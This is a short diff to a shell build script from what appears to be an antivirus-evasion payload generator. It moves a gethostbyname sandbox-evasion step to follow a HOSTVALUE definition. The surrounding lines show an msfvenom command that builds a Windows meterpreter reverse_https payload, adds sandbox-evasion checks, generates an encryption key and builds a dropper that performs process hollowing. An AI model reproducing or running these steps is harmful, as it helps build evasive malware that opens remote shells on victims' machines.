@@ -56,8 +56,8 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
-add_evasion gethostbyname_sandbox_evasion
 printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
+add_evasion gethostbyname_sandbox_evasion
 reset_evasion_technique_counter
 
 # generate key file
@@ -107,8 +107,8 @@ printf "\n+++ Generating dropper executable that performs hollowing +++\n"
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
-add_evasion gethostbyname_sandbox_evasion
 printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
+add_evasion gethostbyname_sandbox_evasion
 
 # generate key file
 generate_key preset bbccdd34ef input/key_raw.txt
